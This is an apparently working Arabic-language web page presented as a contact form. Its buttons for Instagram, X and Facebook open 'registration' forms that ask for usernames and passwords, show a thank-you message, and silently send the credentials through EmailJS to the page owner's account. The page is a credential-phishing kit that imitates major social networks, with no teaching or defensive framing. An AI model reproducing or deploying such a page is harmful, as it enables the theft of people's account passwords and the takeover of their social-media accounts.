<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج الاتصال</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("1xqwBMfecM1SSulsh"); // استبدل بـ Public Key الخاص بك
        })();
    </script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            direction: rtl;
            color: #333;
        }
        h1, h3 {
            color: #4CAF50;
        }
        .welcome-message {
            font-size: 22px;
            color: #4CAF50;
            margin-bottom: 20px;
            transition: opacity 1s ease;
        }
        .platform {
            margin: 20px 0;
            padding: 12px 30px;
            background-color: #4CAF50;
            color: white;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s;
        }
        .platform:hover {
            background-color: #45a049;
        }
        .form-container {
            display: none;
            margin-top: 30px;
        }
        .form-container input, .form-container textarea {
            width: 80%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
        .form-container button {
            padding: 12px 25px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .form-container button:hover {
            background-color: #45a049;
        }
        .thank-you {
            display: none;
            margin-top: 20px;
            color: green;
            font-weight: bold;
        }
        #contact-form {
            margin-top: 30px;
            text-align: left;
        }
        #contact-form input, #contact-form textarea {
            width: 80%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
        #contact-form button {
            padding: 12px 25px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        #contact-form button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <div class="welcome-message" id="welcome-message">
        مرحبًا بك في مهمتنا! اختر المنصة التي تود الانضمام إليها.
    </div>

    <div class="platform" id="instagram">إنستغرام</div>
    <div class="platform" id="x">إكس</div>
    <div class="platform" id="facebook">فيسبوك</div>

    <div class="form-container" id="form-container">
        <h3 id="platform-name">التسجيل في</h3>
        <form id="registration-form">
            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required><br>
            <input type="password" name="password" id="password" placeholder="كلمة المرور" required><br>
            <button type="submit">انضمام</button>
        </form>
    </div>

    <div class="thank-you" id="thank-you">
        <p>شكرًا لتسجيلك!</p>
        <p>تم إرسال معلوماتك بنجاح.</p>
    </div>

    <h1>تواصل معنا</h1>
    <form id="contact-form">
        <input type="text" name="name" placeholder="اسمك" required><br>
        <input type="email" name="email" placeholder="بريدك الإلكتروني" required><br>
        <textarea name="message" placeholder="رسالتك" required></textarea><br>
        <button type="submit">إرسال</button>
    </form>

    <script>
        const platforms = document.querySelectorAll('.platform');
        const formContainer = document.getElementById('form-container');
        const platformName = document.getElementById('platform-name');
        const thankYouMessage = document.getElementById('thank-you');
        const welcomeMessage = document.getElementById('welcome-message');

        platforms.forEach(platform => {
            platform.addEventListener('click', () => {
                platformName.textContent = `التسجيل في ${platform.textContent}`;
                formContainer.style.display = 'block';
                welcomeMessage.style.display = 'none';
                thankYouMessage.style.display = 'none';
            });
        });

        document.getElementById('contact-form').addEventListener('submit', function (event) {
            event.preventDefault();

            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', this)
                .then(function () {
                    alert('تم إرسال الرسالة بنجاح!');
                }, function (error) {
                    alert('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
                });
        });

        document.getElementById('registration-form').addEventListener('submit', function (event) {
            event.preventDefault();

            formContainer.style.display = 'none';
            thankYouMessage.style.display = 'block';

            emailjs.sendForm('service_ir3vg5y', 'template_jw2qkzr', this)
                .then(function () {
                    console.log('تم إرسال البيانات بنجاح!');
                }, function (error) {
                    console.error('حدث خطأ أثناء الإرسال: ' + JSON.stringify(error));
                });
        });
    </script>
</body>
</html>
